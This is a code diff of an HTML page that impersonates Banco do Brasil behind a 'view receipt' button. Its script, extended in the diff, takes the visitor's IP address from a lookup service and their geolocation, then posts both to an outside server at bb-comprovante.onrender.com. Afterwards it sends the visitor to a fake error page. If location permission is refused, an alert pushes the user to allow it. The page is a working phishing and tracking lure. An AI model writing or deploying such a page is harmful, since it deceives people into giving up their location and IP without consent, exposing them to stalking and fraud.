@@ -1,49 +1,60 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Banco do Brasil</title>
-        <link rel="stylesheet" href="styles.css">
-        <link rel="icon" href="favicon.svg" type="image/x-icon">
-    </head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco do Brasil</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="favicon.svg" type="image/x-icon">
+</head>
 <body>
     <button id="getLocation">Visualizar Comprovante</button>
     <div id="result"></div>
 
     <script>
         document.getElementById('getLocation').addEventListener('click', function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const date = new Date();
-                    const timestamp = date.toISOString();
+            // Captura o IP do usuário
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
 
-                    // Redirecionar para o link desejado
-                    window.location.href = 'https://bb-comprovante.onrender.com/erro.html';
+                    // Captura a localização
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            const date = new Date();
+                            const timestamp = date.toISOString();
 
-                    // Enviar dados para o backend
-                    fetch('https://bb-comprovante.onrender.com/api/location', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            latitude: latitude,
-                            longitude: longitude,
-                            timestamp: timestamp
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => console.log('Success:', data))
-                    .catch((error) => console.error('Error:', error));
-                }, function() {
-                    alert('Clique em permitir para visualizar o comprovante.');
-                });
-            } else {
-                alert('Geolocalização não é suportada neste navegador.');
-            }
+                            // Enviar dados para o backend
+                            fetch('https://bb-comprovante.onrender.com/api/location', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    latitude: latitude,
+                                    longitude: longitude,
+                                    ip: userIp, // Inclui o IP no corpo da requisição
+                                    timestamp: timestamp
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Success:', data);
+                                // Redirecionar após o envio bem-sucedido
+                                window.location.href = 'https://bb-comprovante.onrender.com/erro.html';
+                            })
+                            .catch((error) => console.error('Error:', error));
+                        }, function() {
+                            alert('Clique em permitir para visualizar o comprovante.');
+                        });
+                    } else {
+                        alert('Geolocalização não é suportada neste navegador.');
+                    }
+                })
+                .catch(error => console.error('Error fetching IP:', error));
         });
     </script>
 </body>
